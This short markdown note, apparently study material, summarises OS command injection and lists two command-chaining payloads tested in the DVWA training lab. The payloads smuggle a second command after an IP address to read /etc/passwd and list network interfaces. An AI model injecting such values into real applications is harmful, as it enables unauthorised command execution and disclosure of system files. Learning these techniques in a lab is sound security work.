# OS Command Injection

## 1. Executive Summary
Overview of command injection attacks, occurring when an application passes unsanitized user input directly to a system shell execution context.

## 2. Practical Exploit Payloads
```bash
# Command Chaining Payload tested in DVWA
127.0.0.1; cat /etc/passwd
127.0.0.1 | ip a
